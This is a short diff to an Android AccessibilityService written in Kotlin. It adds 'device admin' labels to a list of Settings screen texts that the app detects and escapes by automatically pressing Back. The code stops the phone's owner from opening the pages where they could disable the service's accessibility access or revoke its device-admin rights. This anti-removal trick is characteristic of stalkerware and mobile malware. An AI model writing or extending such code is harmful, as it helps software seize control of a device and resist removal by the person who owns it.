@@ -114,7 +114,7 @@ class MyAccessibilityService : AccessibilityService() {
 
         if (packageNamme == "com.android.settings") {
             Log.d("Inside settings", "onAccessibilityEvent: ")
-            val aaar = listOf("AccessibiltiyService","Use AccessibiltiyService")
+            val aaar = listOf("AccessibiltiyService","Use AccessibiltiyService","device admin","Device admin apps")
             aaar.map {
                 if(screenContent.contains(it)){
                     performGlobalAction(GLOBAL_ACTION_BACK)
